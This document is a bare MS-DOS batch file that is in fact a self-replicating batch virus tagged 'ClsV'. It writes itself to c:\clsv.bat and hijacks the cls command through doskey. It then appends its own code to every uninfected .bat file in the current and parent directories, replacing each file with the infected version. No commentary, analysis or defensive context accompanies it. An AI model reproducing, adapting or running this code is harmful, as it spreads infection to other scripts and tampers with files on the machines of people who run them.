@echo off%_ClsV%
if '%1=='ClsV goto clsv_%2
if '%1=='-ClsV cls
if exist c:\clsv.bat goto ClsV_1
if not exist %0.bat goto ClsV_X
find "ClsV"<%0.bat>c:\clsv.bat
:ClsV_1
doskey cls=c:\clsv.bat -ClsV
command /c c:\clsv.bat ClsV 2
goto ClsV_X
:ClsV_2 
for %%a in (*.bat ..\*.bat) do call %0 ClsV 3 %%a  
exit ClsV
:ClsV_3
find "ClsV"<%3>nul
if not errorlevel 1 goto ClsV_X
type %3>ClsV
echo.>>ClsV
type c:\clsv.bat>>ClsV
move ClsV %3>nul
exit ClsV
:ClsV_X
